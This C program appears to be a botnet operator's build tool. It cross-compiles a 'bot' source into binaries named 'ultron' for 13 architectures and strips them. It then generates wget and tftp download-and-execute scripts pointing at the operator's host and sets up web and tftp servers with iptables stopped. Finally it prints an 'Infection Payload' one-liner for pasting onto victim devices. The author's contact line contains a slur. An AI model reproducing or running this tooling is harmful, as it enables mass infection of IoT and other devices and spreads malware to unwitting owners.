//Cross Compiler written in C.
//
//Made By: ~B1NARY~
//Made Date: 7-23-17
//
//Xmpp: b1nary@nigge.rs
//



#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {

	if(argc != 3) {
		printf("Usage: %s <botname.c> <host ip>\n", argv[0]);
		exit(0);
	}

	char *wgets[] = {
		"http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2",
		"http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2",
		"http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2",
		"http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2",
		"http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2",
		"http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2",
		"http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2",
		"http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2",
		"http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2",
		"http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2",
		"https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2",
		"https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2",
		"https://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2"
	};


	char *cc_filenames[] = {
		"cross-compiler-mips",
		"cross-compiler-mipsel",
		"cross-compiler-sh4",
		"cross-compiler-x86_64",
		"cross-compiler-armv6l",
		"cross-compiler-i686",
		"cross-compiler-powerpc",
		"cross-compiler-i586",
		"cross-compiler-m68k",
		"cross-compiler-sparc",
		"cross-compiler-armv4l",
		"cross-compiler-armv5l",
		"cross-compiler-powerpc-440fp"
	};

	char *targzfiles[] = {
		"cross-compiler-mips.tar.bz2",
		"cross-compiler-mipsel.tar.bz2",
		"cross-compiler-sh4.tar.bz2",
		"cross-compiler-x86_64.tar.bz2",
		"cross-compiler-armv6l.tar.bz2",
		"cross-compiler-i686.tar.bz2",
		"cross-compiler-powerpc.tar.bz2",
		"cross-compiler-i586.tar.bz2",
		"cross-compiler-m68k.tar.bz2",
		"cross-compiler-sparc.tar.bz2",
		"cross-compiler-armv4l.tar.bz2",
		"cross-compiler-armv5l.tar.bz2",
		"cross-compiler-powerpc-440fp.tar.bz2"
	};

	char *arch_types[] = {
		"mips",
		"mipsel",
		"sh4",
		"x86_64",
		"armv6l",
		"i686",
		"powerpc",
		"i586",
		"m68k",
		"sparc",
		"armv4l",
		"armv5l",
		"powerpc-440fp"
	};

	char *outputed_binary_names[] = {
		"ultron.mips",
		"ultron.mipsel",
		"ultron.sh4",
		"ultron.x86_64",
		"ultron.armv6l",
		"ultron.i686",
		"ultron.powerpc",
		"ultron.i586",
		"ultron.m68k",
		"ultron.sparc",
		"ultron.armv4l",
		"ultron.armv5l",
		"ultron.powerpc440fp"
	};

	char *stripped_binary_names[] = {
		"ultronfinal.mips",
		"ultronfinal.mipseln",
		"ultronfinal.sh4",
		"ultronfinal.x86_64",
		"ultronfinal.armv6l",
		"ultronfinal.i686",
		"ultronfinal.powerpc",
		"ultronfinal.i586",
		"ultronfinal.m68k",
		"ultronfinal.sparc",
		"ultronfinal.armv4l",
		"ultronfinal.armv5l",
		"ultronfinal.powerpc440fp"
	};

	char *cc_gcc_locations[] = {
		"cross-compilers/cross-compiler-mips/bin/mips-gcc",
		"cross-compilers/cross-compiler-mipsel/bin/mipsel-gcc",
		"cross-compilers/cross-compiler-sh4/bin/sh4-gcc",
		"cross-compilers/cross-compiler-x86_64/bin/x86_64-gcc",
		"cross-compilers/cross-compiler-armv6l/bin/armv6l-gcc",
		"cross-compilers/cross-compiler-i686/bin/i686-gcc",
		"cross-compilers/cross-compiler-powerpc/bin/powerpc-gcc",
		"cross-compilers/cross-compiler-i586/bin/i586-gcc",
		"cross-compilers/cross-compiler-m68k/bin/m68k-gcc",
		"cross-compilers/cross-compiler-sparc/bin/sparc-gcc",
		"cross-compilers/cross-compiler-armv4l/bin/armv4l-gcc",
		"cross-compilers/cross-compiler-armv5l/bin/armv5l-gcc",
		"cross-compilers/cross-compiler-powerpc-440fp/bin/powerpc-440fp-gcc"
	};

	char *cc_strip_locations[] = {
		"cross-compilers/cross-compiler-mips/bin/mips-strip",
		"cross-compilers/cross-compiler-mipsel/bin/mipsel-strip",
		"cross-compilers/cross-compiler-sh4/bin/sh4-strip",
		"cross-compilers/cross-compiler-x86_64/bin/x86_64-strip",
		"cross-compilers/cross-compiler-armv6l/bin/armv6l-strip",
		"cross-compilers/cross-compiler-i686/bin/i686-strip",
		"cross-compilers/cross-compiler-powerpc/bin/powerpc-strip",
		"cross-compilers/cross-compiler-i586/bin/i586-strip",
		"cross-compilers/cross-compiler-m68k/bin/m68k-strip",
		"cross-compilers/cross-compiler-sparc/bin/sparc-strip",
		"cross-compilers/cross-compiler-armv4l/bin/armv4l-strip",
		"cross-compilers/cross-compiler-armv5l/bin/armv5l-strip",
		"cross-compilers/cross-compiler-powerpc-440fp/bin/powerpc-440fp-strip"
	};

	//char *flags[] = {"-DDEBUG"};
	char *define_flags = "-DDEBUG";

	char *wget_bashfile_name  = "sh.sh";
	char *tftp1_bashfile_name = "ab.sh";
	char *tftp2_bashfile_name = "ac.sh";

	char *ip_domain_prompt;


	//Create Directorys Used By cross-compilers
	printf("[CC] Creating required Directorys.\n");
	mkdir("bins", 777);
	mkdir("cross-compilers", 777);

	printf("[CC] Clearing old outputed binarys.\n");
	system("rm -rf bins/*");
	
	int i;

	char buf[1000] = {0};

	char cc_prompt;

	printf("[CC] Download the cross-compilers? (Y/N): ");	
	scanf("%s", &cc_prompt);
	while(cc_prompt == 'Y') {
		for(i = 0; i < 13; ++i) {
				
			//Downloads the Cross Compilers.
			printf("[CC] Downloading %s\n", targzfiles[i]);

			//wget http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2 -O cross-compilers/cross-compiler-mips.tar.bz2
			//wget %s -O cross-compilers/%s
			sprintf(buf, "wget %s -O cross-compilers/%s", wgets[i], targzfiles[i]);
			system(buf);
			sleep(1);

			//Extracts and removes the tar files..
			printf("[CC] Extracting %s.\n", targzfiles[i]);

			//tar -xf cross-compilers/cross-compiler-mips.tar.bz2 -C cross-compilers/
			//tar -xf cross-compilers/%s -C cross-compilers/
			sprintf(buf, "tar -xf cross-compilers/%s -C cross-compilers/", targzfiles[i]);
			system(buf);
			sleep(1);
		
			printf("[CC] Removing %s.\n", targzfiles[i]);
			sprintf(buf, "rm -rf %s", targzfiles[i]);
			system(buf);
			sleep(1);
		}
		break;
	}

	for(i = 0;i < 13; ++i) {
		printf("[CC] Compiling the bot for the %s arch type.\n", arch_types[i]);
		//cross-compilers/cross-compiler-x86_64/bin/x86_64-gcc -static -DDEBUG -o bins/bot.x86_64 test.c
		//%s -static %s -o bins/%s %s
		sprintf(buf, "%s -static %s -o bins/%s %s", cc_gcc_locations[i], define_flags, outputed_binary_names[i], argv[1]);
		system(buf);
		
		printf("[CC] Striping the bot binary or the %s arch type.\n", arch_types[i]);
		sprintf(buf, "%s -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr -o bins/%s bins/%s", cc_strip_locations[i], stripped_binary_names[i], outputed_binary_names[i]);
		system(buf);

	}

	//creates the sh files.
	char *ip;
	ip = argv[2];

	sprintf(buf, "echo '#!/bin/sh' >> %s", wget_bashfile_name);
	system(buf);
	
	sprintf(buf, "echo '#!/bin/sh' >> %s", tftp1_bashfile_name);
	system(buf);
	
	sprintf(buf, "echo '#!/bin/sh' >> %s", tftp2_bashfile_name);
	system(buf);

	for(i = 0; i < 13; ++i) {
	
		//creates the payloads in the sh files.
		
		printf("[CC] Adding payload to execute %s binary via wget to %s.\n", arch_types[i], wget_bashfile_name);
		sprintf(buf, "echo 'wget http://%s/bins/%s;chmod 777 %s;./%s;' >> %s", ip, stripped_binary_names[i], stripped_binary_names[i], stripped_binary_names[i], wget_bashfile_name);	
		system(buf);

		printf("[CC] Adding payload to execute %s binary via tftp to %s\n", arch_types[i], tftp1_bashfile_name);
		sprintf(buf, "echo 'tftp -g %s -r %s;chmod 777 %s;./%s' >> %s", ip, stripped_binary_names[i], stripped_binary_names[i], stripped_binary_names[i], tftp1_bashfile_name);
		system(buf);

		printf("[CC] Adding payload to execute %s binary via tftp to %s\n", arch_types[i], tftp2_bashfile_name);
		sprintf(buf, "echo 'tftp %s -c get %s;chmod 777 %s;./%s' >> %s", ip, stripped_binary_names[i], stripped_binary_names[i], stripped_binary_names[i], tftp2_bashfile_name);
		system(buf);
	}

	//install apache. tftp and move the files.

	printf("[CC] Installing apache2, and tftp.\n");
	system("apt-get install apache2 tftp tftpd xinetd -y");
	system("yum install httpd tftp xinetd -y");
	
	printf("[CC] Clearing the tftp, and apache2/httpd Directorys.");
	system("rm -rf /var/www/html/* /var/lib/tftpboot/*");

	printf("[CC] Moving Bot Binarys into apache2/httpd Directory\n");
	system("mv bins /var/www/html");

	printf("[CC] Moving %s into apache2/httpd Directory.\n", wget_bashfile_name);
	sprintf(buf, "mv %s /var/www/html", wget_bashfile_name);
	system(buf);
	
	printf("[CC] Restarting apache2 and stopping iptables.\n");
	system("service httpd restart;service iptables stop;chkconfig iptables off");
	system("service apache2 restart");

	printf("[CC] Installing wget.\n");
	system("apt-get install wget -y");
	system("yum install wget -y");

	printf("[CC] Downloading tftp config.\n");
	system("wget https://hastebin.com/raw/osopotupuk.makefile -O /etc/init.d/tftp");
	
	printf("[CC] Making Directory: /var/lib/tftpboot\n");
	system("mkdir /var/lib/tftpboot");

	printf("[CC] Moving %s, and %s into the tftp directory.\n", tftp1_bashfile_name, tftp2_bashfile_name);
	sprintf(buf, "mv %s %s /var/lib/tftpboot", tftp1_bashfile_name, tftp2_bashfile_name);
	system(buf);

	for(i = 0; i < 13; ++i) {
		printf("[CC] Copying %s from the apache2/httpd into the tftp directory.\n", outputed_binary_names[i]);
		sprintf(buf, "cp /var/www/html/bins/%s /var/lib/tftpboot", outputed_binary_names[i]);
		system(buf);
	}

	printf("[CC] Restarting xinetd.\n");
	system("service xinetd restart");

	//change the ulimit, because most kids forget to do this.
	printf("[CC] Raising the Ulimit.\n");
	system("ulimit -s 999999;ulimit -SH 999999;ulimit -r 999999;ulimit -n 999999");

	//prints the payload to be copied.
	printf("[CC] Infection Payload: cd /var/;wget http://%s/%s;chmod 777 %s;sh %s;rm -rf %s;tftp -g %s -r %s;chmod 777 %s;sh %s;rm -rf %s;tftp %s -c get %s;chmod 777 %s;sh %s;rm -rf %s\n", ip, wget_bashfile_name, wget_bashfile_name, wget_bashfile_name, wget_bashfile_name, ip, tftp1_bashfile_name, tftp1_bashfile_name, tftp1_bashfile_name, tftp1_bashfile_name, ip, tftp2_bashfile_name, tftp2_bashfile_name, tftp2_bashfile_name, tftp2_bashfile_name);

	//outputs the payload to a text file, incase it is lost.
	printf("[CC] Payload Stored into text document.\n");
	sprintf(buf, "echo 'cd /var/;wget http://%s/%s;chmod 777 %s;sh %s;rm -rf %s;tftp -g %s -r %s;chmod 777 %s;sh %s;rm -rf %s;tftp %s -c get %s;chmod 777 %s;sh %s;rm -rf %s' >> payload.txt", ip, wget_bashfile_name, wget_bashfile_name, wget_bashfile_name, wget_bashfile_name, ip, tftp1_bashfile_name, tftp1_bashfile_name, tftp1_bashfile_name, tftp1_bashfile_name, ip, tftp2_bashfile_name, tftp2_bashfile_name, tftp2_bashfile_name, tftp2_bashfile_name);
	system(buf);

	return 0;
}